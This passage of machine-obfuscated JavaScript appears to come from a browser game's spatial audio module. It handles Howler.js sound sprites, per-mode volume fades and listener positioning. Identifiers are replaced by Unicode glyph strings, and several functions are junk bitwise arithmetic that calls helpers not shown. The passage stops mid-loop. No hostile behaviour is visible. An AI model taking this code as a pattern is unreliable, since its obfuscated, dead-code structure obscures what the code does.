		function ᐃᐃΔᐃⲆᐃⲆ(ⲆⵠⲆⲆⵠ, ΔΔᐃᐃⲆᐃᐃ, ΔΔⵠⵠⵠᐃⲆ, ᐃⲆΔⵠᐃΔΔ, ᐃΔⲆᐃⲆⵠᐃ, ⲆΔᐃⵠⲆⵠΔ) {
			ⵠⲆⵠⲆⵠⵠⲆ(ⲆᐃΔⵠⲆ, ⲆⵠⲆⲆⵠ, ΔΔᐃᐃⲆᐃᐃ, ΔΔⵠⵠⵠᐃⲆ, ᐃⲆΔⵠᐃΔΔ, ᐃΔⲆᐃⲆⵠᐃ, ⲆΔᐃⵠⲆⵠΔ);
			const ᐃᐃΔᐃⵠⵠⵠ = ~(7587 & ΔᐃΔᐃ[ᐃⵠⲆ]) & (7587 | ΔᐃΔᐃ[Ⲇᐃᐃᐃ]);
			const ⲆⲆᐃⲆᐃᐃⲆ = (8 << ((ᐃᐃΔᐃⵠⵠⵠ ^ ΔᐃΔᐃ[2]) >> 24 & 255)) + (16 << ((ᐃᐃΔᐃⵠⵠⵠ ^ ΔᐃΔᐃ[2]) >> 0 & 255)) + (24 << ((ᐃᐃΔᐃⵠⵠⵠ ^ ΔᐃΔᐃ[ΔⵠᐃⲆ]) >> 16 & 255)) + (0 << ((ᐃᐃΔᐃⵠⵠⵠ ^ ΔᐃΔᐃ[2]) >> 8 & 255));
			const ΔⵠΔⵠᐃⲆΔⵠᐃ = (ⲆⲆᐃⲆᐃᐃⲆ | 33900) & ~(33900 & ⲆⲆᐃⲆᐃᐃⲆ);
			const ⵠΔΔⲆΔⲆⵠ = (17744 + (ΔⵠΔⵠᐃⲆΔⵠᐃ ^ ΔᐃΔᐃ[ⲆᐃᐃΔ])) % 65388;
			const ⲆΔᐃⲆⲆᐃΔⲆⲆ = ~(ⵠΔΔⲆΔⲆⵠ & 37847) & 37847 | ~(37847 & ⵠΔΔⲆΔⲆⵠ) & ⵠΔΔⲆΔⲆⵠ;
			return ⲆΔᐃⲆⲆᐃΔⲆⲆ
		}
		let ⲆᐃΔⵠⲆ = ⵠⵠΔⵠΔ;
		let ΔᐃΔᐃ = undefined;
		const ᐃᐃⵠᐃᐃΔⲆ = ⲆⵠᐃⲆⲆⲆⲆ;
		ⲆⵠᐃⲆⲆⲆⲆ = function() {
			ⲆᐃΔⵠⲆ = ⵠᐃⵠⵠⵠⵠⲆ(ΔⲆᐃⵠⵠⵠᐃ(13));
			ΔᐃΔᐃ = ⲆᐃⲆⵠⵠⵠⲆ(ⲆᐃΔⵠⲆ);
			if (ᐃᐃⵠᐃᐃΔⲆ) ᐃᐃⵠᐃᐃΔⲆ()
		};
		ᐃΔⵠⲆΔ = {
			"ⲆⲆⵠᐃⵠⵠᐃ": 300,
			"ᐃΔⵠᐃΔⵠⲆ": ΔᐃⲆⲆⲆ,
			"ⲆⲆΔⵠΔⲆⵠᐃᐃ": .2,
			"ⵠⵠⲆΔⵠⲆⲆ": ᐃⵠΔ,
			"ΔⲆᐃΔᐃⲆΔ": 4,
			"ⲆᐃΔⲆⲆⵠⵠ": ⵠᐃⲆΔΔ,
			"ⵠⵠΔΔᐃᐃⲆ": ⵠΔᐃᐃⵠ,
			"ᐃⲆⵠⲆΔΔᐃ": 100,
			"ⵠⲆⲆΔᐃⵠⵠⲆᐃ": .2,
			"ⵠⲆᐃᐃⲆΔᐃ": 1,
			"ⲆΔⵠⵠⵠᐃΔⵠⵠ": .2,
			"ΔⲆⲆΔⵠ": ΔⲆΔΔΔ,
			"ⵠⵠΔⵠΔⲆⲆΔΔ": .4,
			"ΔΔⲆΔΔⵠᐃ": 3
		};
		var ᐃΔⲆᐃⲆⲆᐃ = function(ⵠᐃΔᐃᐃⵠᐃ, ⵠΔⲆΔ, ⲆⵠⲆΔⵠ) {
			this.ⵠᐃΔᐃᐃⵠᐃ = ⵠᐃΔᐃᐃⵠᐃ;
			this.c = 0;
			this.ⵠΔⲆΔ = ⵠΔⲆΔ;
			this.ⲆⵠⲆΔⵠ = ⲆⵠⲆΔⵠ;
			this.max = ⲆⵠⲆΔⵠ.length;
			this.play = function() {
				this.c = (this.c + ⵠᐃⵠΔ) % this.max;
				var ᐃΔ = this.ⲆⵠⲆΔⵠ[this.c];
				this.ⵠᐃΔᐃᐃⵠᐃ.ΔⲆΔΔᐃᐃⲆ(this.ⵠΔⲆΔ, ᐃΔ);
				this.ⵠΔⲆΔ[ⵠ[500]](ᐃΔ)
			}
		};
		var ⵠΔⵠΔⵠⵠⲆᐃⵠ = function(ᐃᐃⲆᐃΔ) {
			this.ⲆⲆⲆΔⵠⲆⵠ = 1;
			this.ⲆᐃΔΔ = ⲆⲆⲆᐃ;
			this.mode = -1;
			this.ⲆΔᐃⲆⲆ = ⲆⲆⵠⲆ.sample.ⲆΔᐃⲆⲆ[ᐃᐃⲆᐃΔ];
			this.ⵠⲆⵠⲆΔⲆΔ = ⲆⲆⵠⲆ.sample.ⵠⲆⵠⲆΔⲆΔ[ᐃᐃⲆᐃΔ];
			this.ⵠⵠᐃᐃⵠᐃΔ = ⲆⲆⵠⲆ.sample.ⵠⵠᐃᐃⵠᐃΔ[ᐃᐃⲆᐃΔ];
			this.ᐃΔΔΔⵠΔᐃ = ⲆⲆⵠⲆ.sample.ᐃΔΔΔⵠΔᐃ[ᐃᐃⲆᐃΔ];
			this.ᐃΔᐃᐃⵠⲆΔ = new ᐃΔⲆᐃⲆⲆᐃ(this, ᐃΔⵠΔⲆ.ΔⵠⵠΔΔⲆΔ.ΔⲆΔΔᐃ, ⲆⲆⵠⲆ.ΔΔᐃΔΔ.ᐃΔᐃᐃⵠⲆΔ[ᐃᐃⲆᐃΔ]);
			this.ⲆᐃΔᐃΔ = new ᐃΔⲆᐃⲆⲆᐃ(this, ᐃΔⵠΔⲆ.ⲆⲆⵠΔⲆⲆᐃ.ΔⲆΔΔᐃ, ⲆⲆⵠⲆ.ΔΔᐃΔΔ.ⲆᐃΔᐃΔ[ᐃᐃⲆᐃΔ]);
			this.ᐃⲆⲆⲆⵠ = new ᐃΔⲆᐃⲆⲆᐃ(this, ᐃΔⵠΔⲆ.ᐃΔᐃⲆⲆΔΔ.ΔⲆΔΔᐃ, ⲆⲆⵠⲆ.ΔΔᐃΔΔ.ᐃⲆⲆⲆⵠ[ᐃᐃⲆᐃΔ]);
			this.ᐃᐃⲆᐃΔ = ᐃᐃⲆᐃΔ;
			this.x = 0;
			this.y = 0;
			this.ΔⲆⵠⲆΔ = ΔᐃΔΔ;
			this.ΔⲆΔⲆΔ = ᐃΔⵠⲆΔ.ΔᐃⵠⵠΔⲆⲆᐃⲆ;
			this.ⵠΔΔᐃ = {
				x: ΔΔⵠ,
				y: 0
			};
			this.ᐃΔⲆΔⲆ = ᐃΔⵠΔⲆ.ΔⵠΔᐃΔⵠⵠ.ΔⲆΔΔᐃ;
			this.ΔᐃΔⲆᐃⲆΔΔᐃ = function(Ⲇᐃᐃᐃᐃᐃᐃ) {
				if (Ⲇᐃᐃᐃᐃᐃᐃ === ᐃⲆΔᐃ.ᐃⲆᐃΔᐃ) this.ᐃΔᐃᐃⵠⲆΔ.play();
				else if (Ⲇᐃᐃᐃᐃᐃᐃ === ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ) this.ⲆᐃΔᐃΔ.play();
				else if (Ⲇᐃᐃᐃᐃᐃᐃ === ᐃⲆΔᐃ.ΔⵠⵠΔᐃ) this.ᐃⲆⲆⲆⵠ.play()
			};
			this.ⵠⲆΔΔΔΔᐃ = function(ᐃⲆⲆ) {
				if (0 < ᐃⲆⲆ.ⵠⲆΔⲆΔⲆᐃ) return ᐃΔⵠⲆΔ.ΔⲆⲆΔⵠ;
				else if (0 < ᐃⲆⲆ.ΔⲆⲆᐃⵠⲆⵠ) return ᐃΔⵠⲆΔ.ⵠⲆᐃᐃⲆΔᐃ;
				else if (Δᐃᐃⵠ < ᐃⲆⲆ.ⵠΔΔⲆΔ || ⵠΔⲆⵠ < ᐃⲆⲆ.ΔⵠΔΔⵠ) return ᐃΔⵠⲆΔ.ΔΔⲆΔΔⵠᐃ;
				else return ᐃΔⵠⲆΔ.ⵠⵠⲆΔⵠⲆⲆ
			};
			this.ⲆⲆⲆΔⵠ = function(ⲆᐃΔΔ) {
				this.ⲆⲆⲆΔⵠⲆⵠ = 0;
				this.ⲆᐃΔΔ = ⲆᐃΔΔ;
				var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ⲆᐃΔΔ];
				ᐃⲆⲆ.ᐃᐃⲆᐃΔ = this.ᐃᐃⲆᐃΔ;
				this.mode = this.ⵠⲆΔΔΔΔᐃ(ᐃⲆⲆ);
				this.ⵠΔΔᐃ.x = ᐃⲆⲆ.x;
				this.ⵠΔΔᐃ.y = ᐃⲆⲆ.y
			};
			this.ⵠⲆΔⵠΔᐃΔ = function() {
				this.ⲆⲆⲆΔⵠⲆⵠ = 1;
				this.mode = -1;
				this.ᐃΔⲆΔⲆ[ⵠ[232]](this.ⲆΔᐃⲆⲆ);
				this.ᐃΔⲆΔⲆ[ⵠ[232]](this.ⵠⲆⵠⲆΔⲆΔ);
				this.ᐃΔⲆΔⲆ[ⵠ[232]](this.ⵠⵠᐃᐃⵠᐃΔ);
				this.ᐃΔⲆΔⲆ[ⵠ[232]](this.ᐃΔΔΔⵠΔᐃ)
			};
			this.fade = function(ᐃΔ, ᐃΔᐃ) {
				var ΔᐃΔ = ᐃⵠᐃⵠⲆ.ᐃⲆΔᐃⵠΔⲆ * this.ᐃΔⲆΔⲆ[ⵠ[255]](ᐃΔ);
				this.ᐃΔⲆΔⲆ[ⵠ[315]](ΔᐃΔ, ᐃⵠΔ, ᐃΔᐃ, ᐃΔ)
			};
			this.ΔⲆΔΔᐃᐃⲆ = function(ⵠΔⲆΔ, ᐃΔ) {
				if (this.ΔⲆⵠⲆΔ && this.ᐃᐃⲆᐃΔ) {
					ⵠΔⲆΔ[ⵠ[307]](this.x, this.y, -.5, ᐃΔ)
				}
			};
			this.ⵠᐃⲆΔⵠ = function(ᐃΔ, ᐃᐃⲆᐃⵠⵠΔ, Δⵠⵠᐃⵠ, ⲆⲆᐃΔⲆ, ΔΔⲆΔ, ΔⲆΔⲆΔ, ᐃΔᐃ) {
				this.ΔⲆΔⲆΔ = ΔⲆΔⲆΔ;
				if (ⲆⲆᐃΔⲆ && this.mode === ΔΔⲆΔ) {
					var ΔᐃΔ = this.ᐃΔⲆΔⲆ[ⵠ[ᐃᐃⲆⵠⲆ]](ᐃΔ) * ᐃⵠᐃⵠⲆ.ᐃⲆΔᐃⵠΔⲆ;
					if (this.ΔⲆⵠⲆΔ) {
						var ⲆⲆⵠ = ᐃⵠᐃⵠⲆ.ᐃⲆΔᐃⵠΔⲆ * (Δⵠⵠᐃⵠ * Math.random() + ᐃᐃⲆᐃⵠⵠΔ);
						this.ᐃΔⲆΔⲆ[ⵠ[315]](ΔᐃΔ, ⲆⲆⵠ, ᐃΔᐃ, ᐃΔ)
					} else this.ᐃΔⲆΔⲆ[ⵠ[315]](ΔᐃΔ, 0, ᐃΔᐃ, ᐃΔ)
				} else if (ΔΔⲆΔ != this.mode && this.ΔⲆⵠⲆΔ) {
					this.ᐃΔⲆΔⲆ[ⵠ[315]](0, ᐃⵠᐃⵠⲆ.ᐃⲆΔᐃⵠΔⲆ * (ᐃᐃⲆᐃⵠⵠΔ + Δⵠⵠᐃⵠ), ᐃΔᐃ, ᐃΔ)
				} else if (this.ΔⲆⵠⲆΔ) {
					var ΔᐃΔ = ᐃⵠᐃⵠⲆ.ᐃⲆΔᐃⵠΔⲆ * this.ᐃΔⲆΔⲆ[ⵠ[255]](ᐃΔ);
					var ⲆⲆⵠ = (Math.random() * Δⵠⵠᐃⵠ + ᐃᐃⲆᐃⵠⵠΔ) * ᐃⵠᐃⵠⲆ.ᐃⲆΔᐃⵠΔⲆ;
					this.ᐃΔⲆΔⲆ[ⵠ[315]](ΔᐃΔ, ⲆⲆⵠ, ᐃΔᐃ, ᐃΔ)
				}
				this.ΔⲆΔΔᐃᐃⲆ(this.ᐃΔⲆΔⲆ, ᐃΔ);
				this.ᐃΔⲆΔⲆ[ⵠ[500]](ᐃΔ)
			};
			this.ⵠⲆᐃ = function() {
				var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[this.ⲆᐃΔΔ];
				this.ΔⲆΔⲆΔ -= ᐃⵠᐃᐃ;
				if (Δᐃᐃᐃ < this.ΔⲆΔⲆΔ) return;
				var ⲆⲆᐃΔⲆ = ᐃⵠⲆⵠ;
				if (this.ⵠΔΔᐃ.x != ᐃⲆⲆ.x || this.ⵠΔΔᐃ.y != ᐃⲆⲆ.y) {
					!this.ΔⲆⵠⲆΔ && (ⲆⲆᐃΔⲆ = ᐃⲆᐃ, this.ΔⲆⵠⲆΔ = ⵠᐃⵠΔ);
					this.x = ⲆⲆⵠⲆ.ⲆⲆⵠⵠΔΔⵠ(ᐃⲆⲆ.x, ᐃΔⵠⲆΔ.ⵠⵠΔΔᐃᐃⲆ);
					this.y = ⲆⲆⵠⲆ.ⵠᐃⵠΔᐃⵠΔ(ᐃⲆⲆ.y, ᐃΔⵠⲆΔ.ⵠⵠΔΔᐃᐃⲆ)
				} else {
					this.ΔⲆⵠⲆΔ && (ⲆⲆᐃΔⲆ = ⵠΔᐃ, this.ΔⲆⵠⲆΔ = 0)
				}
				this.ⵠΔΔᐃ.x = ᐃⲆⲆ.x;
				this.ⵠΔΔᐃ.y = ᐃⲆⲆ.y;
				ΔΔⲆΔ = this.ⵠⲆΔΔΔΔᐃ(ᐃⲆⲆ);
				if (ΔΔⲆΔ != this.mode) {
					if (ᐃΔⵠⲆΔ.ⵠⲆᐃᐃⲆΔᐃ === this.mode) this.fade(this.ⲆΔᐃⲆⲆ, ᐃΔⵠⲆΔ.ⲆⲆⵠᐃⵠⵠᐃ);
					else if (this.mode === ᐃΔⵠⲆΔ.ΔⲆⲆΔⵠ) this.fade(this.ⵠⲆⵠⲆΔⲆΔ, ᐃΔⵠⲆΔ.ᐃΔⵠᐃΔⵠⲆ);
					else if (this.mode === ᐃΔⵠⲆΔ.ⵠⵠⲆΔⵠⲆⲆ) this.fade(this.ⵠⵠᐃᐃⵠᐃΔ, ᐃΔⵠⲆΔ.ⲆᐃΔⲆⲆⵠⵠ);
					else if (ᐃΔⵠⲆΔ.ΔΔⲆΔΔⵠᐃ === this.mode) this.fade(this.ᐃΔΔΔⵠΔᐃ, ᐃΔⵠⲆΔ.ᐃⲆⵠⲆΔΔᐃ)
				}
				if (ᐃΔⵠⲆΔ.ⵠⲆᐃᐃⲆΔᐃ === ΔΔⲆΔ) this.ⵠᐃⲆΔⵠ(this.ⲆΔᐃⲆⲆ, .08, .3, ⲆⲆᐃΔⲆ, ΔΔⲆΔ, ᐃΔⵠⲆΔ.ⵠⵠΔⵠΔⲆⲆΔΔ, ᐃΔⵠⲆΔ.ⲆⲆⵠᐃⵠⵠᐃ);
				else if (ᐃΔⵠⲆΔ.ΔⲆⲆΔⵠ === ΔΔⲆΔ) this.ⵠᐃⲆΔⵠ(this.ⵠⲆⵠⲆΔⲆΔ, .2, .3, ⲆⲆᐃΔⲆ, ΔΔⲆΔ, ᐃΔⵠⲆΔ.ⲆΔⵠⵠⵠᐃΔⵠⵠ, ᐃΔⵠⲆΔ.ᐃΔⵠᐃΔⵠⲆ);
				else if (ΔΔⲆΔ === ᐃΔⵠⲆΔ.ⵠⵠⲆΔⵠⲆⲆ) this.ⵠᐃⲆΔⵠ(this.ⵠⵠᐃᐃⵠᐃΔ, .3, .6, ⲆⲆᐃΔⲆ, ΔΔⲆΔ, ᐃΔⵠⲆΔ.ⵠⲆⲆΔᐃⵠⵠⲆᐃ, ᐃΔⵠⲆΔ.ⲆᐃΔⲆⲆⵠⵠ);
				else if (ᐃΔⵠⲆΔ.ΔΔⲆΔΔⵠᐃ === ΔΔⲆΔ) this.ⵠᐃⲆΔⵠ(this.ᐃΔΔΔⵠΔᐃ, .1, .25, ⲆⲆᐃΔⲆ, ΔΔⲆΔ, ᐃΔⵠⲆΔ.ⲆⲆΔⵠΔⲆⵠᐃᐃ, ᐃΔⵠⲆΔ.ᐃⲆⵠⲆΔΔᐃ);
				this.mode = ΔΔⲆΔ
			};
			this.check = function() {
				var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[this.ⲆᐃΔΔ];
				if (!ᐃⲆⲆ) {
					this.ⵠⲆΔⵠΔᐃΔ(ᐃⲆⲆ);
					return ⲆⲆᐃⵠᐃ
				}
				return true
			}
		};

		function ⲆΔΔⵠΔⲆΔ(ⵠᐃⵠⵠΔᐃⲆ, ⲆⲆΔΔᐃᐃⵠ, ⲆΔΔⵠⵠᐃⲆ) {
			const ᐃⵠⵠᐃⵠΔⵠ = ((ⵠᐃⵠⵠΔᐃⲆ + 53552) * 214013 + 2531011) % 4294967296;
			const ⲆⵠⵠⵠᐃⲆᐃ = ~(49203 & ⲆⲆΔΔᐃᐃⵠ) & (ⲆⲆΔΔᐃᐃⵠ | 49203);
			const ⵠΔᐃⲆΔᐃᐃ = ~(48741 & ⲆΔΔⵠⵠᐃⲆ) & ⲆΔΔⵠⵠᐃⲆ | ~(ⲆΔΔⵠⵠᐃⲆ & 48741) & 48741;
			const ᐃⲆΔΔΔΔⲆⵠΔ = ᐃᐃΔⵠⵠⵠᐃ(ᐃⵠⵠᐃⵠΔⵠ, ⲆⵠⵠⵠᐃⲆᐃ, ⵠΔᐃⲆΔᐃᐃ, ᐃⵠⵠᐃⵠΔⵠ, ⲆⵠⵠⵠᐃⲆᐃ, ⵠΔᐃⲆΔᐃᐃ);
			const ⲆⵠⵠᐃᐃΔΔΔᐃ = ᐃⵠΔΔⵠᐃΔ(ᐃⵠⵠᐃⵠΔⵠ, ⲆⵠⵠⵠᐃⲆᐃ, ⵠΔᐃⲆΔᐃᐃ);
			const ΔᐃⲆΔⵠⵠⵠΔⵠ = (((ᐃⲆΔΔΔΔⲆⵠΔ ^ ⲆⵠⵠᐃᐃΔΔΔᐃ) + 55316) * 1103515245 + 12345) % 2147483648;
			return ΔᐃⲆΔⵠⵠⵠΔⵠ
		}

		function ᐃⵠⲆⵠΔⲆΔ(ᐃⵠᐃⲆΔ, ⲆᐃⲆⵠⲆᐃⲆ, ᐃⲆⲆⵠΔΔΔ) {
			const ᐃΔⵠⲆᐃΔΔ = (24 << (ᐃⵠᐃⲆΔ >> 16 & 255)) + (ⵠⲆᐃⲆᐃΔⲆ << (ᐃⵠᐃⲆΔ >> 24 & ⲆΔⵠᐃⵠᐃⵠ)) + (8 << (ᐃⵠᐃⲆΔ >> 0 & 255)) + (0 << (ᐃⵠᐃⲆΔ >> 8 & ᐃⵠᐃᐃᐃⲆΔ));
			const ΔⲆΔΔᐃⵠᐃ = (15119 + ⲆᐃⲆⵠⲆᐃⲆ) % 65313;
			const ⲆⵠᐃΔΔΔⲆ = ~(48392 & ᐃⲆⲆⵠΔΔΔ) & (48392 | ᐃⲆⲆⵠΔΔΔ);
			const ᐃⵠⵠⲆⲆⵠⵠ = ᐃΔⲆΔⵠΔⵠⲆⲆ(ᐃΔⵠⲆᐃΔΔ, ΔⲆΔΔᐃⵠᐃ, ⲆⵠᐃΔΔΔⲆ, ᐃΔⵠⲆᐃΔΔ, ΔⲆΔΔᐃⵠᐃ, ⲆⵠᐃΔΔΔⲆ);
			const ΔᐃⲆⵠⵠΔᐃⲆⲆ = ⲆᐃⲆⲆⲆΔΔ(ᐃΔⵠⲆᐃΔΔ, ΔⲆΔΔᐃⵠᐃ, ⲆⵠᐃΔΔΔⲆ, ᐃΔⵠⲆᐃΔΔ, ΔⲆΔΔᐃⵠᐃ);
			const ᐃⲆⵠΔΔΔⲆⵠΔ = ~(32887 & ᐃⵠⵠⲆⲆⵠⵠ) & 32887 | ~(32887 & ᐃⵠⵠⲆⲆⵠⵠ) & ᐃⵠⵠⲆⲆⵠⵠ;
			return ᐃⲆⵠΔΔΔⲆⵠΔ
		}
		var ΔᐃⲆⲆⵠΔⲆᐃΔ = function() {
			this.ⲆΔΔᐃⵠ = ⵠⲆᐃⵠ;
			this.loaded = ΔΔⵠ;
			this.transition = 0;
			this.ⵠⵠⵠⵠΔᐃΔ = function(Δⵠ) {
				return 100 * (Δⵠ / ⲆⲆⲆ.w)
			};
			this.ⵠⲆΔⵠΔᐃⲆ = function(ⲆⵠⲆ) {
				return ⲆᐃᐃΔⵠᐃΔ * (ⲆⵠⲆ / ⲆⲆⲆ.ⵠⵠᐃ)
			};
			this.ⲆⲆⵠⵠΔΔⵠ = function(Δⵠ, ᐃΔᐃ) {
				Δⵠ = this.ⵠⵠⵠⵠΔᐃΔ(Δⵠ) - this.ᐃᐃΔⵠⲆ.x;
				return this.ᐃᐃΔⵠⲆ.x + ᐃΔᐃ * Δⵠ
			};
			this.ⵠᐃⵠΔᐃⵠΔ = function(ⲆⵠⲆ, ᐃΔᐃ) {
				ⲆⵠⲆ = Math.abs(this.ⵠⲆΔⵠΔᐃⲆ(ⲆⵠⲆ) - this.ᐃᐃΔⵠⲆ.y);
				return this.ᐃᐃΔⵠⲆ.y + ᐃΔᐃ * ⲆⵠⲆ
			};
			this.sample = {};
			this.ΔΔᐃΔΔ = {};
			this.ⵠΔⲆΔ = {};
			this.ⲆᐃⵠⵠᐃΔⵠ = function(ᐃⲆⲆ, ᐃⵠⲆΔ, Δⵠ, ⲆⵠⲆ) {
				for (var ⵠᐃ = ᐃⵠⲆ; ⵠᐃ < ᐃⵠⲆΔ.length; ⵠᐃ++) {
					var ᐃΔ = ᐃⵠⲆΔ[ⵠᐃ];
					if (ᐃⲆⲆ[ⵠ[421]](ᐃΔ)) continue;
					ᐃⲆⲆ[ⵠ[307]](Δⵠ, ⲆⵠⲆ, -.5, ᐃΔ);
					ᐃⲆⲆ[ⵠ[500]](ᐃΔ);
					return ⵠⲆΔᐃⲆ
				}
				return false
			};
			this.Δᐃⵠ = function(ᐃΔ, ΔⲆΔΔᐃ, Δⵠ, ⲆⵠⲆ) {
				Δⵠ = this.ⲆⲆⵠⵠΔΔⵠ(Δⵠ, ᐃΔⵠⲆΔ.ΔⲆᐃΔᐃⲆΔ);
				ⲆⵠⲆ = this.ⵠᐃⵠΔᐃⵠΔ(ⲆⵠⲆ, ᐃΔⵠⲆΔ.ΔⲆᐃΔᐃⲆΔ);
				console.log("HIT", ᐃΔ, ΔⲆΔΔᐃ, Δⵠ, ⲆⵠⲆ, ᐃΔⵠⲆΔ.ΔⲆᐃΔᐃⲆΔ);
				if (!ᐃΔ) this.ⲆᐃⵠⵠᐃΔⵠ(this.ⵠΔⲆΔ.ΔⲆⲆⲆᐃ, this.sample.ΔⲆⲆⲆᐃ, Δⵠ, ⲆⵠⲆ);
				else {
					if (1 === ΔⲆΔΔᐃ) this.ⲆᐃⵠⵠᐃΔⵠ(this.ⵠΔⲆΔ.ⵠᐃⲆΔⵠⵠᐃ, this.sample.ⵠᐃⲆΔⵠⵠᐃ, Δⵠ, ⲆⵠⲆ);
					else if (ΔⲆΔΔᐃ === ΔΔⵠ) this.ⲆᐃⵠⵠᐃΔⵠ(this.ⵠΔⲆΔ.ⵠⲆᐃᐃⲆΔⵠ, this.sample.ⵠⲆᐃᐃⲆΔⵠ, Δⵠ, ⲆⵠⲆ)
				}
			};
			this.ᐃᐃΔⵠⲆ = {
				y: 0,
				x: ⲆΔⵠ
			};
			this.ΔᐃⵠᐃⵠΔΔ = {
				y: 0,
				x: ΔΔⵠⵠ
			};
			this.ᐃᐃⵠⲆⲆ = {};
			this.ᐃᐃᐃⵠ = [];
			this.ᐃΔⲆΔⲆ = function(ᐃⲆⲆ, ⵠⲆᐃ) {
				for (var ⲆⲆᐃⲆ in this.ᐃᐃⵠⲆⲆ) {
					var ᐃᐃⵠⲆⲆ = this.ᐃᐃⵠⲆⲆ[ⲆⲆᐃⲆ];
					ᐃᐃⵠⲆⲆ.check(ᐃⲆⲆ);
					if (ᐃᐃⵠⲆⲆ.ΔᐃᐃⵠΔⲆᐃ) {
						if (ⲆⲆⲆ.ⲆΔΔΔⵠ.now < ᐃⲆΔᐃ.ᐃⲆΔΔᐃⲆΔ) ᐃᐃⵠⲆⲆ.ⵠᐃⲆΔⵠ();
						if (ⵠⲆᐃ) ᐃᐃⵠⲆⲆ.ⵠⲆᐃ(ᐃⲆⲆ, this.ᐃᐃΔⵠⲆ);
						if (this.transition) ᐃᐃⵠⲆⲆ.transition()
					}
				}
				if (this.transition) this.transition = 0
			};
			this.ΔⵠΔᐃᐃⲆⵠⲆⵠ = function() {
				var ⲆⲆⵠΔ = [];
				for (var ⵠᐃ = ΔᐃΔΔ; this.ᐃᐃᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
					var ᐃⲆⲆ = this.ᐃᐃᐃⵠ[ⵠᐃ];
					if (ᐃⲆⲆ.ⲆⲆⲆΔⵠⲆⵠ) ⲆⲆⵠΔ.push(ⵠᐃ);
					else if (!ᐃⲆⲆ.ⲆⲆⲆΔⵠⲆⵠ && !ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃⲆⲆ.ⲆᐃΔΔ]) {
						ᐃⲆⲆ.ⵠⲆΔⵠΔᐃΔ();
						ⲆⲆⵠΔ.push(ⵠᐃ)
					}
				}
				var ᐃᐃᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ];
				for (var ⵠᐃ = 0, ᐃⵠᐃⵠ = 0; ᐃᐃᐃⵠ.length > ⵠᐃ && ⲆⲆⵠΔ.length > ᐃⵠᐃⵠ; ⵠᐃ++) {
					var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⵠᐃ];
					if (ΔᐃᐃΔ.ΔⵠⲆᐃⵠΔⵠ == ⲆⲆⲆ.mode && ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃⲆⲆ.id].ⵠΔⵠⲆᐃ === ⵠ[575] || -ᐃⲆᐃ !== ᐃⲆⲆ.ᐃᐃⲆᐃΔ || ᐃⲆⲆ.ⲆᐃΔΔ === ᐃᐃΔ.ⲆᐃΔΔ) continue;
					this.ᐃᐃᐃⵠ[ⲆⲆⵠΔ[ᐃⵠᐃⵠ]].ⲆⲆⲆΔⵠ(ᐃⲆⲆ.ⲆᐃΔΔ);
					ᐃⵠᐃⵠ++
				}
			};
			this.ΔⵠᐃⵠⵠⲆⵠⲆᐃ = function() {
				this.ΔⵠΔᐃᐃⲆⵠⲆⵠ();
				for (var ⵠᐃ = 0; ⵠᐃ < this.ᐃᐃᐃⵠ.length; ⵠᐃ++) {
					var ᐃⲆⲆ = this.ᐃᐃᐃⵠ[ⵠᐃ];
					if (ᐃⲆⲆ.ⲆⲆⲆΔⵠⲆⵠ || !ᐃⲆⲆ.check()) continue;
					ᐃⲆⲆ.ⵠⲆᐃ()
				}
			};
			this.ⲆᐃΔΔᐃᐃⵠᐃᐃ = function(ᐃⲆⲆ) {
				if (ᐃⲆⲆ.x === this.ΔᐃⵠᐃⵠΔΔ.x && ᐃⲆⲆ.y === this.ΔᐃⵠᐃⵠΔΔ.y) return 0;
				this.ΔᐃⵠᐃⵠΔΔ.x = ᐃⲆⲆ.x;
				this.ΔᐃⵠᐃⵠΔΔ.y = ᐃⲆⲆ.y;
				this.ᐃᐃΔⵠⲆ.x = this.ⵠⵠⵠⵠΔᐃΔ(ᐃⲆⲆ.x);
				this.ᐃᐃΔⵠⲆ.y = this.ⵠⲆΔⵠΔᐃⲆ(ᐃⲆⲆ.y);
				Howler[ⵠ[307]](this.ᐃᐃΔⵠⲆ.x, this.ᐃᐃΔⵠⲆ.y, 0);
				return ΔⲆᐃᐃ
			};
			this.ΔΔᐃᐃΔΔΔⵠⲆ = function() {
				if (!this.ⲆΔΔᐃⵠ || !this.loaded) return;
				var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
				if (!ᐃⲆⲆ) return;
				ᐃⲆⲆ.ᐃᐃⲆᐃΔ = Δᐃᐃᐃ;
				var ⵠⲆᐃ = this.ⲆᐃΔΔᐃᐃⵠᐃᐃ(ᐃⲆⲆ);
				if (ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ !== ⲆⲆⲆ.mode && ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ !== ⲆⲆⲆ.mode && ⲆⲆⲆ.mode !== ΔᐃᐃΔ.ⲆⵠⲆⵠᐃⲆΔ) this.ᐃΔⲆΔⲆ(ᐃⲆⲆ, ⵠⲆᐃ);
				this.ΔⵠᐃⵠⵠⲆⵠⲆᐃ()
			};
			this.ⵠᐃᐃᐃΔⲆᐃⲆΔ = function() {
				var ΔΔᐃΔⵠ = null;
				for (var ΔⲆΔΔᐃ in ᐃΔⵠΔⲆ) {
					var ᐃⵠⲆΔ = ᐃΔⵠΔⲆ[ΔⲆΔΔᐃ];
					if (typeof ᐃⵠⲆΔ === ⵠ[186] && ᐃⵠⲆΔ.path) {
						ᐃⵠⲆΔ.ΔⲆΔΔᐃ = new Howl({
							src: ᐃⵠⲆΔ.path,
							volume: 0,
							sprite: ᐃⵠⲆΔ.ⵠⲆ
						})
					}
					for (var ⲆⲆᐃⲆ in ᐃⵠⲆΔ.sample) {
						var ᐃⵠⵠⵠ = ᐃⵠⲆΔ.sample[ⲆⲆᐃⲆ];
						var ⲆⲆⵠΔ = [];
						console.log(ⲆΔΔΔⲆ);
						for (var ⵠᐃ = 0; ⵠᐃ < ᐃⵠⵠⵠ; ⵠᐃ++) {
